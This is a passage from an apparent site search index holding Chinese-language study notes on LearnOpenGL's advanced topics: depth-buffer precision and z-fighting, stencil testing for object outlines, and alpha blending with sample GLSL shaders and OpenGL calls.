\u4e4b\u95f4\uff0c\u6211\u4eec\u9700\u8981\u67d0\u79cd\u65b9\u7a0b\u5c06\u5c4f\u5e55\u5750\u6807\u7684 z \u503c\u8f6c\u6362\u4e3a\u6df1\u5ea6\u503c\uff0c\u4e00\u79cd\u7b80\u5355\u7684\u60f3\u6cd5\u662f\u4f7f\u7528\u7ebf\u6027\u6df1\u5ea6\u7f13\u51b2\uff1a</p> \\[ F_{depth}= \\frac{z-near}{far -near} \\] <p>\u4f46\u662f\u7531\u4e8e\u6570\u636e\u7684\u7cbe\u5ea6\u9650\u5236\uff0c\u5bf9\u4e8e\u975e\u5e38\u8fd1\u7684\u7269\u4f53\u6216\u8005\u975e\u5e38\u8fdc\u7684\u7269\u4f53\uff0c\u5b83\u4eec\u6df1\u5ea6\u6d4b\u8bd5\u903b\u8f91\u6b63\u786e\u7684\u6982\u7387\u662f\u76f8\u7b49\u7684\u3002\u4f46\u662f\uff0c\u6211\u4eec\u771f\u7684\u9700\u8981\u5bf91000\u5355\u4f4d\u8fdc\u7684\u6df1\u5ea6\u503c\u548c\u53ea\u67091\u5355\u4f4d\u8fdc\u7684\u5145\u6ee1\u7ec6\u8282\u7684\u7269\u4f53\u4f7f\u7528\u76f8\u540c\u7684\u7cbe\u5ea6\u5417\uff1f\u7ebf\u6027\u65b9\u7a0b\u5e76\u6ca1\u6709\u8003\u8651\u8fd9\u4e00\u70b9\u3002</p> <p>\u4e00\u4e2a\u8003\u8651\u4e86\u8fdc\u8fd1\u8ddd\u79bb\u7684\u65b9\u7a0b\u4e3a\uff1a</p> \\[ F_{depth} = \\frac{\\frac{1}{z}- \\frac{1}{{near}} }{ \\frac{1}{far} - \\frac{1}{near}} \\] <p></p> <p>\u4e3a\u4e86\u53ef\u89c6\u5316\u8fd9\u4e9b\u6df1\u5ea6\u6570\u636e\u7684\u53d8\u5316\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8f93\u51fa\u4e3a\u989c\u8272\uff1a</p> <pre><code>void main()\n{\n    FragColor = vec4(vec3(gl_FragCoord.z), 1.0);\n}\n</code></pre> <p>\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u6ce8\u610f\u5230\u7531\u8fd1\u5230\u8fdc\u7684\u7269\u4f53\uff0c\u989c\u8272\u4ece\u9ed1\u5230\u767d\u7684\u975e\u7ebf\u6027\u53d8\u5316\u4e86\u3002</p> <p><code>gl_FragCoord.z</code> \u5c31\u662f\u8f6c\u6362\u540e\u7684\u6df1\u5ea6\u503c</p> <p>\u6df1\u5ea6\u51b2\u7a81</p> <p>\u5f53\u4e24\u4e2a\u9762\u7684\u6df1\u5ea6\u503c\u76f8\u540c\u65f6\uff0c\u6df1\u5ea6\u6d4b\u8bd5\u65e0\u6cd5\u51b3\u5b9a\u8be5\u663e\u793a\u54ea\u4e00\u4e2a\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u4e24\u4e2a\u9762\u7684\u4e0d\u65ad\u5207\u6362\u663e\u793a\u987a\u5e8f\u3002</p> <p>\u6df1\u5ea6\u51b2\u7a81\u662f\u6df1\u5ea6\u7f13\u51b2\u7684\u4e00\u4e2a\u5e38\u89c1\u95ee\u9898\uff0c\u5f53\u7269\u4f53\u5728\u8fdc\u5904\u65f6\u6548\u679c\u4f1a\u66f4\u660e\u663e\uff08\u56e0\u4e3a\u6df1\u5ea6\u7f13\u51b2\u5728z\u503c\u8f83\u5927\u65f6\u6709\u66f4\u5c0f\u7684\u7cbe\u5ea6\uff09\u3002\u6df1\u5ea6\u51b2\u7a81\u4e0d\u80fd\u591f\u88ab\u5b8c\u5168\u907f\u514d\u3002</p> <p>\u5bf9\u4e8e\u9632\u6b62\u6df1\u5ea6\u51b2\u7a81\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e09\u79cd\u5bf9\u7b56\uff1a</p> <p>\u7b2c\u4e00\u4e2a\u4e5f\u662f\u6700\u91cd\u8981\u7684\u6280\u5de7\u662f\u6c38\u8fdc\u4e0d\u8981\u628a\u591a\u4e2a\u7269\u4f53\u6446\u5f97\u592a\u9760\u8fd1\uff0c\u4ee5\u81f3\u4e8e\u5b83\u4eec\u7684\u4e00\u4e9b\u4e09\u89d2\u5f62\u4f1a\u91cd\u53e0\u3002\u901a\u8fc7\u5728\u4e24\u4e2a\u7269\u4f53\u4e4b\u95f4\u8bbe\u7f6e\u4e00\u4e2a\u7528\u6237\u65e0\u6cd5\u6ce8\u610f\u5230\u7684\u504f\u79fb\u503c\uff0c\u4f60\u53ef\u4ee5\u5b8c\u5168\u907f\u514d\u8fd9\u4e24\u4e2a\u7269\u4f53\u4e4b\u95f4\u7684\u6df1\u5ea6\u51b2\u7a81\u3002\u5728\u7bb1\u5b50\u548c\u5730\u677f\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u7bb1\u5b50\u6cbf\u7740\u6b63y\u8f74\u7a0d\u5fae\u79fb\u52a8\u4e00\u70b9\u3002\u7bb1\u5b50\u4f4d\u7f6e\u7684\u8fd9\u70b9\u5fae\u5c0f\u6539\u53d8\u5c06\u4e0d\u592a\u53ef\u80fd\u88ab\u6ce8\u610f\u5230\uff0c\u4f46\u5b83\u80fd\u591f\u5b8c\u5168\u51cf\u5c11\u6df1\u5ea6\u51b2\u7a81\u7684\u53d1\u751f\u3002\u7136\u800c\uff0c\u8fd9\u9700\u8981\u5bf9\u6bcf\u4e2a\u7269\u4f53\u90fd\u624b\u52a8\u8c03\u6574\uff0c\u5e76\u4e14\u9700\u8981\u8fdb\u884c\u5f7b\u5e95\u7684\u6d4b\u8bd5\u6765\u4fdd\u8bc1\u573a\u666f\u4e2d\u6ca1\u6709\u7269\u4f53\u4f1a\u4ea7\u751f\u6df1\u5ea6\u51b2\u7a81\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u6280\u5de7\u662f\u5c3d\u53ef\u80fd\u5c06\u8fd1\u5e73\u9762\u8bbe\u7f6e\u8fdc\u4e00\u4e9b\u3002\u5728\u524d\u9762\u6211\u4eec\u63d0\u5230\u4e86\u7cbe\u5ea6\u5728\u9760\u8fd1\u8fd1\u5e73\u9762\u65f6\u662f\u975e\u5e38\u9ad8\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5c06\u8fd1\u5e73\u9762\u8fdc\u79bb\u89c2\u5bdf\u8005\uff0c\u6211\u4eec\u5c06\u4f1a\u5bf9\u6574\u4e2a\u5e73\u622a\u5934\u4f53\u6709\u7740\u66f4\u5927\u7684\u7cbe\u5ea6\u3002\u7136\u800c\uff0c\u5c06\u8fd1\u5e73\u9762\u8bbe\u7f6e\u592a\u8fdc\u5c06\u4f1a\u5bfc\u81f4\u8fd1\u5904\u7684\u7269\u4f53\u88ab\u88c1\u526a\u6389\uff0c\u6240\u4ee5\u8fd9\u901a\u5e38\u9700\u8981\u5b9e\u9a8c\u548c\u5fae\u8c03\u6765\u51b3\u5b9a\u6700\u9002\u5408\u4f60\u7684\u573a\u666f\u7684\u8fd1\u5e73\u9762\u8ddd\u79bb\u3002</p> <p>\u53e6\u5916\u4e00\u4e2a\u5f88\u597d\u7684\u6280\u5de7\u662f\u727a\u7272\u4e00\u4e9b\u6027\u80fd\uff0c\u4f7f\u7528\u66f4\u9ad8\u7cbe\u5ea6\u7684\u6df1\u5ea6\u7f13\u51b2\u3002\u5927\u90e8\u5206\u6df1\u5ea6\u7f13\u51b2\u7684\u7cbe\u5ea6\u90fd\u662f24\u4f4d\u7684\uff0c\u4f46\u73b0\u5728\u5927\u90e8\u5206\u7684\u663e\u5361\u90fd\u652f\u630132\u4f4d\u7684\u6df1\u5ea6\u7f13\u51b2\uff0c\u8fd9\u5c06\u4f1a\u6781\u5927\u5730\u63d0\u9ad8\u7cbe\u5ea6\u3002\u6240\u4ee5\uff0c\u727a\u7272\u6389\u4e00\u4e9b\u6027\u80fd\uff0c\u4f60\u5c31\u80fd\u83b7\u5f97\u66f4\u9ad8\u7cbe\u5ea6\u7684\u6df1\u5ea6\u6d4b\u8bd5\uff0c\u51cf\u5c11\u6df1\u5ea6\u51b2\u7a81\u3002</p> <p>\u6211\u4eec\u4e0a\u9762\u8ba8\u8bba\u7684\u4e09\u4e2a\u6280\u672f\u662f\u6700\u666e\u904d\u4e5f\u662f\u5f88\u5bb9\u6613\u5b9e\u73b0\u7684\u6297\u6df1\u5ea6\u51b2\u7a81\u6280\u672f\u4e86\u3002\u8fd8\u6709\u4e00\u4e9b\u66f4\u590d\u6742\u7684\u6280\u672f\uff0c\u4f46\u5b83\u4eec\u4f9d\u7136\u4e0d\u80fd\u5b8c\u5168\u6d88\u9664\u6df1\u5ea6\u51b2\u7a81\u3002\u6df1\u5ea6\u51b2\u7a81\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u95ee\u9898\uff0c\u4f46\u5982\u679c\u4f60\u7ec4\u5408\u4f7f\u7528\u4e86\u4e0a\u9762\u5217\u4e3e\u51fa\u6765\u7684\u6280\u672f\uff0c\u4f60\u53ef\u80fd\u4e0d\u4f1a\u518d\u9700\u8981\u5904\u7406\u6df1\u5ea6\u51b2\u7a81\u4e86\u3002</p>"},{"location":"Accumulation/LearnOpenGL/4.%E9%AB%98%E7%BA%A7OpenGL/#_2","title":"\u6a21\u677f\u6d4b\u8bd5","text":"<p>\u5f53\u7740\u8272\u5668\u5904\u7406\u5b8c\u4e00\u4e2a\u7247\u6bb5\u4e4b\u540e\uff0c\u5e76\u4e14\u5728\u8fdb\u884c\u6df1\u5ea6\u6d4b\u8bd5\u4e4b\u524d\uff0c\u6a21\u677f\u6d4b\u8bd5\u5f00\u59cb\u8fd0\u884c\u3002\u6a21\u677f\u6d4b\u8bd5\u6839\u636e\u6a21\u677f\u7f13\u51b2\u8fd0\u884c\uff0c\u5b83\u4e5f\u53ef\u80fd\u4f1a\u4e22\u5f03\u4e00\u4e9b\u7247\u6bb5\u3002</p> <p>GLFW\u81ea\u52a8\u914d\u7f6e\u4e86\u6a21\u677f\u7f13\u51b2\uff0c\u4f46\u662f\u5176\u5b83\u7a97\u53e3\u5e93\u53ef\u80fd\u6ca1\u6709\uff0c\u9700\u8981\u67e5\u770b\u5bf9\u5e94\u5e93\u6587\u6863</p> <p>\u6a21\u677f\u7f13\u51b2\u7684\u4e00\u4e2a\u7b80\u5355\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <p></p> <p>\u6a21\u677f\u7f13\u51b2\u9996\u5148\u4f1a\u88ab\u6e05\u9664\u4e3a0\uff0c\u4e4b\u540e\u5728\u6a21\u677f\u7f13\u51b2\u4e2d\u4f7f\u75281\u586b\u5145\u4e86\u4e00\u4e2a\u7a7a\u5fc3\u77e9\u5f62\u3002\u573a\u666f\u4e2d\u7684\u7247\u6bb5\u5c06\u4f1a\u53ea\u5728\u7247\u6bb5\u7684\u6a21\u677f\u503c\u4e3a1\u7684\u65f6\u5019\u4f1a\u88ab\u6e32\u67d3\uff08\u5176\u5b83\u7684\u90fd\u88ab\u4e22\u5f03\u4e86\uff09\u3002</p> <p>\u6a21\u677f\u7f13\u51b2\u64cd\u4f5c\u5141\u8bb8\u6211\u4eec\u5728\u6e32\u67d3\u7247\u6bb5\u65f6\u5c06\u6a21\u677f\u7f13\u51b2\u8bbe\u5b9a\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684\u503c\u3002\u901a\u8fc7\u5728\u6e32\u67d3\u65f6\u4fee\u6539\u6a21\u677f\u7f13\u51b2\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5199\u5165\u4e86\u6a21\u677f\u7f13\u51b2\u3002\u5728\u540c\u4e00\u4e2a\uff08\u6216\u8005\u63a5\u4e0b\u6765\u7684\uff09\u6e32\u67d3\u8fed\u4ee3\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u8fd9\u4e9b\u503c\uff0c\u6765\u51b3\u5b9a\u4e22\u5f03\u8fd8\u662f\u4fdd\u7559\u67d0\u4e2a\u7247\u6bb5\u3002\u4f7f\u7528\u6a21\u677f\u7f13\u51b2\u7684\u65f6\u5019\u4f60\u53ef\u4ee5\u5c3d\u60c5\u53d1\u6325\uff0c\u4f46\u5927\u4f53\u7684\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ul> <li>\u542f\u7528\u6a21\u677f\u7f13\u51b2\u7684\u5199\u5165\u3002</li> <li>\u6e32\u67d3\u7269\u4f53\uff0c\u66f4\u65b0\u6a21\u677f\u7f13\u51b2\u7684\u5185\u5bb9\u3002</li> <li>\u7981\u7528\u6a21\u677f\u7f13\u51b2\u7684\u5199\u5165\u3002</li> <li>\u6e32\u67d3\uff08\u5176\u5b83\uff09\u7269\u4f53\uff0c\u8fd9\u6b21\u6839\u636e\u6a21\u677f\u7f13\u51b2\u7684\u5185\u5bb9\u4e22\u5f03\u7279\u5b9a\u7684\u7247\u6bb5\u3002</li> </ul> <p>\u6240\u4ee5\uff0c\u901a\u8fc7\u4f7f\u7528\u6a21\u677f\u7f13\u51b2\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u573a\u666f\u4e2d\u5df2\u7ed8\u5236\u7684\u5176\u5b83\u7269\u4f53\u7684\u7247\u6bb5\uff0c\u6765\u51b3\u5b9a\u662f\u5426\u4e22\u5f03\u7279\u5b9a\u7684\u7247\u6bb5\u3002</p> <p>\u8ddf\u6df1\u5ea6\u6d4b\u8bd5\u76f8\u540c\uff0c\u6211\u4eec\u901a\u8fc7\u4ee5\u4e0b\u4ee3\u7801\u542f\u7528\u548c\u6e05\u7a7a\u6a21\u677f\u7f13\u51b2\uff1a</p> <pre><code>glEnable(GL_STENCIL_TEST);\n\n// in render loop:\nglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT | GL_STENCIL_BUFFER_BIT);\n</code></pre> <p>\u5bf9\u4e8e\u6a21\u677f\u7f13\u51b2\u662f\u5426\u5e94\u8be5\u901a\u8fc7\uff0c\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\u7528\u6765\u914d\u7f6e\u6a21\u677f\u6d4b\u8bd5\uff1a</p> <pre><code>glStencilFunc(GL_EQUAL, 1, 0xFF);\n\nglStencilOp(GL_KEEP, GL_KEEP, GL_KEEP);\n</code></pre> <p>\u5bf9\u4e8e <code>glStencilFunc(func, ref, mask)</code> \uff1a</p> <ul> <li><code>func</code>\uff1a\u8bbe\u7f6e\u6a21\u677f\u6d4b\u8bd5\u51fd\u6570(Stencil Test Function)\u3002\u8fd9\u4e2a\u6d4b\u8bd5\u51fd\u6570\u5c06\u4f1a\u5e94\u7528\u5230\u5df2\u50a8\u5b58\u7684\u6a21\u677f\u503c\u4e0a\u548cglStencilFunc\u51fd\u6570\u7684<code>ref</code>\u503c\u4e0a\u3002\u53ef\u7528\u7684\u9009\u9879\u6709\uff1aGL_NEVER\u3001GL_LESS\u3001GL_LEQUAL\u3001GL_GREATER\u3001GL_GEQUAL\u3001GL_EQUAL\u3001GL_NOTEQUAL\u548cGL_ALWAYS\u3002\u5b83\u4eec\u7684\u8bed\u4e49\u548c\u6df1\u5ea6\u7f13\u51b2\u7684\u51fd\u6570\u7c7b\u4f3c\u3002</li> <li><code>ref</code>\uff1a\u8bbe\u7f6e\u4e86\u6a21\u677f\u6d4b\u8bd5\u7684\u53c2\u8003\u503c(Reference Value)\u3002\u6a21\u677f\u7f13\u51b2\u7684\u5185\u5bb9\u5c06\u4f1a\u4e0e\u8fd9\u4e2a\u503c\u8fdb\u884c\u6bd4\u8f83\u3002</li> <li><code>mask</code>\uff1a\u8bbe\u7f6e\u4e00\u4e2a\u63a9\u7801\uff0c\u5b83\u5c06\u4f1a\u4e0e\u53c2\u8003\u503c\u548c\u50a8\u5b58\u7684\u6a21\u677f\u503c\u5728\u6d4b\u8bd5\u6bd4\u8f83\u5b83\u4eec\u4e4b\u524d\u8fdb\u884c\u4e0e(AND)\u8fd0\u7b97\u3002\u521d\u59cb\u60c5\u51b5\u4e0b\u6240\u6709\u4f4d\u90fd\u4e3a1\u3002</li> </ul> <p>\u4e0a\u4e00\u51fd\u6570\u53ea\u544a\u8bc9 OpenGL \u5982\u4f55\u8fdb\u884c\u6bd4\u8f83\uff0c\u800c <code>glStencilOp(sfail, dpfail, dppass)</code> \u5219\u544a\u8bc9 OpenGL \u5982\u4f55\u66f4\u65b0\u7f13\u5b58\uff1a</p> <ul> <li><code>sfail</code>\uff1a\u6a21\u677f\u6d4b\u8bd5\u5931\u8d25\u65f6\u91c7\u53d6\u7684\u884c\u4e3a\u3002</li> <li><code>dpfail</code>\uff1a\u6a21\u677f\u6d4b\u8bd5\u901a\u8fc7\uff0c\u4f46\u6df1\u5ea6\u6d4b\u8bd5\u5931\u8d25\u65f6\u91c7\u53d6\u7684\u884c\u4e3a\u3002</li> <li><code>dppass</code>\uff1a\u6a21\u677f\u6d4b\u8bd5\u548c\u6df1\u5ea6\u6d4b\u8bd5\u90fd\u901a\u8fc7\u65f6\u91c7\u53d6\u7684\u884c\u4e3a\u3002</li> </ul> <p>\u6bcf\u4e2a\u9009\u9879\u90fd\u53ef\u4ee5\u9009\u7528\u4ee5\u4e0b\u7684\u5176\u4e2d\u4e00\u79cd\u884c\u4e3a\uff1a</p> \u884c\u4e3a \u63cf\u8ff0 GL_KEEP \u4fdd\u6301\u5f53\u524d\u50a8\u5b58\u7684\u6a21\u677f\u503c GL_ZERO \u5c06\u6a21\u677f\u503c\u8bbe\u7f6e\u4e3a0 GL_REPLACE \u5c06\u6a21\u677f\u503c\u8bbe\u7f6e\u4e3aglStencilFunc\u51fd\u6570\u8bbe\u7f6e\u7684<code>ref</code>\u503c GL_INCR \u5982\u679c\u6a21\u677f\u503c\u5c0f\u4e8e\u6700\u5927\u503c\u5219\u5c06\u6a21\u677f\u503c\u52a01 GL_INCR_WRAP \u4e0eGL_INCR\u4e00\u6837\uff0c\u4f46\u5982\u679c\u6a21\u677f\u503c\u8d85\u8fc7\u4e86\u6700\u5927\u503c\u5219\u5f52\u96f6 GL_DECR \u5982\u679c\u6a21\u677f\u503c\u5927\u4e8e\u6700\u5c0f\u503c\u5219\u5c06\u6a21\u677f\u503c\u51cf1 GL_DECR_WRAP \u4e0eGL_DECR\u4e00\u6837\uff0c\u4f46\u5982\u679c\u6a21\u677f\u503c\u5c0f\u4e8e0\u5219\u5c06\u5176\u8bbe\u7f6e\u4e3a\u6700\u5927\u503c GL_INVERT \u6309\u4f4d\u7ffb\u8f6c\u5f53\u524d\u7684\u6a21\u677f\u7f13\u51b2\u503c <p>\u5728\u4e00\u4e9b\u6e38\u620f\u4e2d\uff0c\u6211\u4eec\u5e38\u5e38\u9700\u8981\u4e3a\u4e00\u4e2a\u9009\u4e2d\u7269\u4f53\u6dfb\u52a0\u6709\u8272\u8fb9\u6846\uff0c\u800c\u8fd9\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u901a\u8fc7\u6a21\u677f\u6d4b\u8bd5\u5b8c\u6210\u3002\u4e3a\u7269\u4f53\u521b\u5efa\u8f6e\u5ed3\u7684\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>\u5728\u7ed8\u5236\uff08\u9700\u8981\u6dfb\u52a0\u8f6e\u5ed3\u7684\uff09\u7269\u4f53\u4e4b\u524d\uff0c\u5c06\u6a21\u677f\u51fd\u6570\u8bbe\u7f6e\u4e3aGL_ALWAYS\uff0c\u6bcf\u5f53\u7269\u4f53\u7684\u7247\u6bb5\u88ab\u6e32\u67d3\u65f6\uff0c\u5c06\u6a21\u677f\u7f13\u51b2\u66f4\u65b0\u4e3a1\u3002</li> <li>\u6e32\u67d3\u7269\u4f53\u3002</li> <li>\u7981\u7528\u6a21\u677f\u5199\u5165\u4ee5\u53ca\u6df1\u5ea6\u6d4b\u8bd5\u3002</li> <li>\u5c06\u6bcf\u4e2a\u7269\u4f53\u7f29\u653e\u4e00\u70b9\u70b9\u3002</li> <li>\u4f7f\u7528\u4e00\u4e2a\u4e0d\u540c\u7684\u7247\u6bb5\u7740\u8272\u5668\uff0c\u8f93\u51fa\u4e00\u4e2a\u5355\u72ec\u7684\uff08\u8fb9\u6846\uff09\u989c\u8272\u3002</li> <li>\u518d\u6b21\u7ed8\u5236\u7269\u4f53\uff0c\u4f46\u53ea\u5728\u5b83\u4eec\u7247\u6bb5\u7684\u6a21\u677f\u503c\u4e0d\u7b49\u4e8e1\u65f6\u624d\u7ed8\u5236\u3002</li> <li>\u518d\u6b21\u542f\u7528\u6a21\u677f\u5199\u5165\u548c\u6df1\u5ea6\u6d4b\u8bd5\u3002</li> </ol> <p>\u8fd9\u4e2a\u8fc7\u7a0b\u5c06\u6bcf\u4e2a\u7269\u4f53\u7684\u7247\u6bb5\u7684\u6a21\u677f\u7f13\u51b2\u8bbe\u7f6e\u4e3a1\uff0c\u5f53\u6211\u4eec\u60f3\u8981\u7ed8\u5236\u8fb9\u6846\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e3b\u8981\u7ed8\u5236\u653e\u5927\u7248\u672c\u7684\u7269\u4f53\u4e2d\u6a21\u677f\u6d4b\u8bd5\u901a\u8fc7\u7684\u90e8\u5206\uff0c\u4e5f\u5c31\u662f\u7269\u4f53\u7684\u8fb9\u6846\u7684\u4f4d\u7f6e\u3002\u6211\u4eec\u4e3b\u8981\u4f7f\u7528\u6a21\u677f\u7f13\u51b2\u4e22\u5f03\u4e86\u653e\u5927\u7248\u672c\u4e2d\u5c5e\u4e8e\u539f\u7269\u4f53\u7247\u6bb5\u7684\u90e8\u5206\u3002</p> <p>\u8fd9\u91cc\u7684\u7981\u7528\u6df1\u5ea6\u6d4b\u8bd5\u662f\u4e3a\u4e86\u4e0d\u8ba9\u8f6e\u5ed3\u88ab\u5730\u677f\u4e4b\u7c7b\u7684\u7269\u4f53\u906e\u6321\uff0c\u5b9e\u9645\u4f7f\u7528\u4e2d\u53ef\u4ee5\u8003\u8651\u4e0d\u7981\u7528</p> <p>\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5e94\u7528\u9ad8\u65af\u6a21\u7cca\u4e4b\u7c7b\u7684\u6280\u672f\u4f7f\u5f97\u8fd9\u4e9b\u8fb9\u6846\u770b\u4e0a\u53bb\u66f4\u52a0\u81ea\u7136\uff1a</p> <p></p>"},{"location":"Accumulation/LearnOpenGL/4.%E9%AB%98%E7%BA%A7OpenGL/#_3","title":"\u6df7\u5408","text":"<p>OpenGL \u4e2d\uff0c\u6df7\u5408\u901a\u5e38\u662f\u7528\u6765\u5b9e\u73b0\u900f\u660e\u7684\u6280\u672f\u3002</p> <p>\u900f\u660e\uff0c\u5373\u5b83\u7684\u989c\u8272\u662f\u7269\u4f53\u672c\u8eab\u7684\u989c\u8272\u4ee5\u53ca\u5b83\u80cc\u540e\u7269\u4f53\u989c\u8272\u7684\u7ed3\u5408</p> <p>\u4e3a\u4e86\u52a0\u8f7d\u5177\u6709 alpha \u503c\u7684\u7eb9\u7406\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u7eb9\u7406\u751f\u6210\u8fc7\u7a0b\u4e2d\u58f0\u660e\u4e00\u4e0b\uff1a</p> <pre><code>glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, data);\n</code></pre> <p>\u540c\u65f6\uff0c\u9700\u8981\u4fdd\u8bc1\u7247\u6bb5\u7740\u8272\u5668\u4e2d\u83b7\u53d6\u4e86\u7eb9\u7406\u7684\u5168\u90e8\u56db\u4e2a\u5206\u91cf\uff1a</p> <pre><code>void main()\n{\n    // FragColor = vec4(vec3(texture(texture1, TexCoords)), 1.0);\n    FragColor = texture(texture1, TexCoords);\n}\n</code></pre> <p>\u90a3\u4e48\u4e00\u79cd\u624b\u52a8\u4e22\u5f03\u900f\u660e\u7247\u6bb5\u7684\u65b9\u5f0f\u4e3a\uff0c\u5728\u7247\u6bb5\u7740\u8272\u5668\u4e2d\u8bbe\u7f6e\u4e00\u4e2a\u9608\u503c\uff0c\u4e22\u5f03\u4f4e\u4e8e\u8fd9\u4e2a\u9608\u503c\u7684\u7247\u6bb5\uff1a</p> <pre><code>#version 330 core\nout vec4 FragColor;\n\nin vec2 TexCoords;\n\nuniform sampler2D texture1;\n\nvoid main()\n{             \n    vec4 texColor = texture(texture1, TexCoords);\n    if(texColor.a &lt; 0.1)\n        discard;\n    FragColor = texColor;\n}\n</code></pre> <p>discard \u547d\u4ee4\u4fdd\u8bc1\u7247\u6bb5\u4e0d\u4f1a\u88ab\u8fdb\u4e00\u6b65\u5904\u7406</p> <p>\u4f46\u662f\u5bf9\u4e8e\u534a\u900f\u660e\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u5e76\u4e0d\u80fd\u7b80\u5355\u7684\u91c7\u7528\u4e22\u5f03\u6765\u5904\u7406\u3002\u901a\u8fc7\u9009\u9879 <code>GL_BLEND</code> \u6765\u542f\u52a8\u6df7\u5408\uff1a</p> <pre><code>glEnable(GL_BLEND);\n</code></pre> <p>OpenGL \u4e2d\u7684\u6df7\u5408\u65b9\u7a0b\u901a\u8fc7\u5982\u4e0b\u65b9\u7a0b\u8ba1\u7b97\uff1a</p> \\[ \\bar{C}_{result}= \\bar{C}_{source} * F_{source} + \\bar{C}_{destination} * F_{destination} \\] <ul> <li>\\(\\bar{C}_{source}\\)\uff1a\u6e90\u989c\u8272\u5411\u91cf\uff0c\u5373\u7eb9\u7406\u672c\u8eab\u7684\u989c\u8272\u5411\u91cf</li> <li>\\(\\bar{C}_{destination}\\)\uff1a\u76ee\u6807\u989c\u8272\u5411\u91cf\uff0c\u5373\u989c\u8272\u7f13\u51b2\u4e2d\u7684\u989c\u8272\u5411\u91cf</li> <li>\\(F_{source}\\)\uff1a\u6e90\u56e0\u5b50\u503c\uff0c\u5373 alpha \u503c\u5bf9\u6e90\u989c\u8272\u7684\u5f71\u54cd</li> <li>\\(F_{destination}\\)\uff1a\u76ee\u6807\u56e0\u5b50\u503c\uff0c\u5373 alpha \u503c\u5bf9\u76ee\u6807\u989c\u8272\u7684\u5f71\u54cd</li> </ul> <p>\u6e90\u989c\u8272\u548c\u76ee\u6807\u989c\u8272\u4f1a\u7531 OpenGL \u81ea\u52a8\u51b3\u5b9a\uff0c\u800c\u56e0\u5b50\u503c\u53ef\u7531\u6211\u4eec\u81ea\u7531\u8bbe\u5b9a\u3002\u53ef\u4ee5\u901a\u8fc7 <code>glBlendFunc</code> \u6765\u8bbe\u7f6e\u6e90\u56e0\u5b50\u548c\u76ee\u6807\u56e0\u5b50\uff1a</p> <pre><code>glBlendFunc(GLenum sfactor, GLenum dfactor);\n</code></pre> \u9009\u9879 \u503c <code>GL_ZERO</code> \u56e0\u5b50\u7b49\u4e8e 0 <code>GL_ONE</code> \u56e0\u5b50\u7b49\u4e8e 1 <code>GL_SRC_COLOR</code> \u56e0\u5b50\u7b49\u4e8e\u6e90\u989c\u8272\u5411\u91cf \\(\\bar{C}_{source}\\) <code>GL_ONE_MINUS_SRC_COLOR</code> \u56e0\u5b50\u7b49\u4e8e \\(1-\\bar{C}_{source}\\) <code>GL_DST_COLOR</code> \u56e0\u5b50\u7b49\u4e8e\u76ee\u6807\u989c\u8272\u5411\u91cf \\(\\bar{C}_{destination}\\) <code>GL_ONE_MINUS_DST_COLOR</code> \u56e0\u5b50\u7b49\u4e8e \\(1- \\bar{C}_{destination}\\) <code>GL_SRC_ALPHA</code> \u56e0\u5b50\u7b49\u4e8e \\(\\bar{C}_{source}\\) \u7684 alpha \u5206\u91cf <code>GL_ONE_MINUS_SRC_ALPHA</code> \u56e0\u5b50\u7b49\u4e8e \\(1-\\bar{C}_{source}\\) \u7684 alpha \u5206\u91cf <code>GL_DST_ALPHA</code> \u56e0\u5b50\u7b49\u4e8e \\(\\bar{C}_{destination}\\) \u7684 alpha \u5206\u91cf <code>GL_ONE_MINUS_DST_ALPHA</code> \u56e0\u5b50\u7b49\u4e8e \\(1-\\bar{C}_{destination}\\) \u7684 alpha \u5206\u91cf <code>GL_CONSTANT_COLOR</code> \u56e0\u5b50\u7b49\u4e8e\u5e38\u6570\u989c\u8272\u5411\u91cf \\(\\bar{C}_{constant}\\) <code>GL_ONE_MINUS_CONSTANT_COLOR</code> \u56e0\u5b50\u7b49\u4e8e \\(1-\\bar{C}_{constant}\\) <code>GL_CONSTANT_ALPHA</code> \u56e0\u5b50\u7b49\u4e8e \\(\\bar{C}_{constant}\\) \u7684 alpha \u5206\u91cf <code>GL_ONE_MINUS_CONSTANT_ALPHA</code> \u56e0\u5b50\u7b49\u4e8e \\(1-\\bar{C}_{constant}\\) \u7684 alpha \u5206\u91cf <p>\u9ed8\u8ba4\u91c7\u7528\u6e90\u989c\u8272\u5411\u91cf\u7684 alpha \u4f5c\u4e3a\u6e90\u56e0\u5b50\uff0c\u4f7f\u7528 1-alpha \u4f5c\u4e3a\u76ee\u6807\u56e0\u5b50\uff1a</p> <pre><code>glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);\n</code></pre> <p>\u6df1\u5ea6\u6d4b\u8bd5\u548c\u6df7\u5408\u4e00\u8d77\u4f7f\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u900f\u660e\u90e8\u5206\u906e\u853d\u540e\u9762</p> <p>\u6df1\u5ea6\u6d4b\u8bd5\u548c\u6df7\u5408\u4e00\u8d77\u4f7f\u7528\u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u4e00\u4e9b\u610f\u60f3\u4e0d\u5230\u7684\u9ebb\u70e6\u3002\u5f53\u5199\u5165\u6df1\u5ea6\u7f13\u51b2\u65f6\uff0cBuffer 